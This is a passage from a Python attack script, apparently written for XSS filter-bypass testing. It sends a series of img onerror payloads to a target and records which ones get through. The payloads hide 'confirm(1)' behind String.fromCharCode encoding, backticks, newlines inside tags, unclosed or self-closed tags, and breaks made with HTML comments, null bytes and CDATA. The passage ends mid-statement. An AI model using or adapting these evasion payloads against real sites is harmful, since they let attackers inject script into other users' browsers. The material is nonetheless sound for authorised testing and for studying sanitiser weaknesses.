print("=" * 80)

# Parser-level confusion
parser_tests = [
    # Unclosed tags
    ("<img src=x onerror=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))", "Unclosed tag"),
    
    # Self-closing with slash
    ("<img src=x onerror=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41)) />", "Self-closing"),
    
    # Attribute without =
    ("<img src=x onerror eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "No equals"),
    
    # Newline in tag
    ("<img\\nsrc=x\\nonerror=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "Newlines in tag"),
    
    # Use backtick instead of quotes where possible
    ("<img src=x onerror=eval(`String.fromCharCode(99,111,110,102,105,114,109,40,49,41)`)>", "Backtick quotes"),
]

for payload, name in parser_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

print("\n" + "=" * 80)
print("TESTING WITH BROKEN/FRAGMENTED INPUT")
print("=" * 80)

# Fragmented input tests
fragment_tests = [
    # Use HTML comments to break up words
    ("<img src=x onerror=eval('con<!-- -->firm(1)')>", "Comment fragmentation"),
    
    # Break up with newline
    ("<img src=x onerror=eval('con\\nfirm(1)')>", "Newline fragmentation"),
    
    # Break up with null byte (if it works)
    ("<img src=x onerror=eval('con\0firm(1)')>", "Null byte fragmentation"),
    
    # Use CDATA
    ("<img src=x onerror=eval('con<![CDATA[firm(1)]]>')>", "CDATA fragmentation"),
]

for payload, name in fragment_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

print("\n" + "=" * 80)
print("FINAL ANALYSIS & RESULTS")
print("=" * 80)

# Analyze all results
if not results:
